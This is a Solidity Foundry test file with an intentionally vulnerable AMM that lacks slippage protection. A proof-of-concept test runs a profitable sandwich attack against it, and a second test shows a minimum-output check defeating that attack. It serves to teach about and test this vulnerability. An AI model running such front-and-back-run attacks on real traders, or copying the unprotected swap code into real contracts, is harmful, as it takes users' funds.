// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/// @notice Minimal constant-product AMM — vulnerable to sandwich attacks (no slippage protection)
contract VulnerableAMM {
    uint256 public reserveX = 1000 ether;
    uint256 public reserveY = 2_000_000e18;

    /// @notice Swap Token X for Token Y — NO slippage protection
    function swapXforY(uint256 amountXIn) external returns (uint256 amountYOut) {
        require(amountXIn > 0, "Zero input");
        amountYOut = (reserveY * amountXIn) / (reserveX + amountXIn);
        reserveX += amountXIn;
        reserveY -= amountYOut;
        return amountYOut;
    }

    /// @notice Swap Token Y for Token X — NO slippage protection
    function swapYforX(uint256 amountYIn) external returns (uint256 amountXOut) {
        require(amountYIn > 0, "Zero input");
        amountXOut = (reserveX * amountYIn) / (reserveY + amountYIn);
        reserveY += amountYIn;
        reserveX -= amountXOut;
        return amountXOut;
    }

    function getSpotPrice() external view returns (uint256) {
        return (reserveY * 1e18) / reserveX;
    }
}

contract SandwichAttackTest is Test {
    VulnerableAMM amm;

    function setUp() public {
        amm = new VulnerableAMM();
    }

    function test_sandwichAttack() public {
        uint256 victimInput = 10 ether;
        uint256 attackerInput = 50 ether;

        // Baseline: What victim would get WITHOUT sandwich
        uint256 fairOutput = (amm.reserveY() * victimInput) / (amm.reserveX() + victimInput);
        uint256 priceBefore = amm.getSpotPrice();

        console.log("=== SANDWICH ATTACK PoC ===");
        console.log("Pool initial: %s ETH / %s USDC", amm.reserveX() / 1e18, amm.reserveY() / 1e18);
        console.log("Spot price before: %s USDC/ETH", priceBefore / 1e18);
        console.log("Victim fair output (no attack): %s USDC", fairOutput / 1e18);

        // Step 1: Attacker FRONTRUNS
        uint256 attackerYReceived = amm.swapXforY(attackerInput);
        console.log("\n--- Attacker Frontrun ---");
        console.log("Attacker received: %s USDC", attackerYReceived / 1e18);
        console.log("Spot price after frontrun: %s USDC/ETH", amm.getSpotPrice() / 1e18);

        // Step 2: Victim's trade executes at WORSE price
        uint256 victimActualOutput = amm.swapXforY(victimInput);
        console.log("\n--- Victim Trade (sandwiched) ---");
        console.log("Victim actual output: %s USDC", victimActualOutput / 1e18);
        console.log("Victim loss: %s USDC", (fairOutput - victimActualOutput) / 1e18);

        // Step 3: Attacker BACKRUNS
        uint256 attackerXBack = amm.swapYforX(attackerYReceived);
        int256 attackerProfit = int256(attackerXBack) - int256(attackerInput);

        console.log("\n=== RESULTS ===");
        console.log("Attacker profit: %s ETH", attackerProfit > 0 ? uint256(attackerProfit) / 1e18 : 0);
        console.log("Victim loss: %s USDC", (fairOutput - victimActualOutput) / 1e18);

        assertLt(victimActualOutput, fairOutput, "Victim should receive less due to sandwich");
        assertGt(attackerXBack, attackerInput, "Attacker should profit from the sandwich");

        if (attackerProfit > 0) {
            emit log("[VULNERABLE] Sandwich attack is profitable — contract lacks slippage protection");
        }
    }

    function test_slippageProtectionBlocksSandwich() public {
        uint256 victimInput = 10 ether;
        uint256 attackerInput = 50 ether;

        uint256 fairOutput = (amm.reserveY() * victimInput) / (amm.reserveX() + victimInput);
        uint256 minAmountOut = (fairOutput * 99) / 100; // 1% max slippage

        amm.swapXforY(attackerInput); // Attacker frontruns

        // Victim's trade would produce less than minAmountOut
        uint256 actualOutput = (amm.reserveY() * victimInput) / (amm.reserveX() + victimInput);

        console.log("=== SLIPPAGE PROTECTION TEST ===");
        console.log("Fair output: %s USDC", fairOutput / 1e18);
        console.log("Min acceptable (1%% slippage): %s USDC", minAmountOut / 1e18);
        console.log("Actual output after frontrun: %s USDC", actualOutput / 1e18);

        if (actualOutput < minAmountOut) {
            console.log("[PROTECTED] Trade would revert — slippage exceeded");
        }

        assertLt(actualOutput, minAmountOut, "Frontrun should push output below slippage tolerance");
    }
}
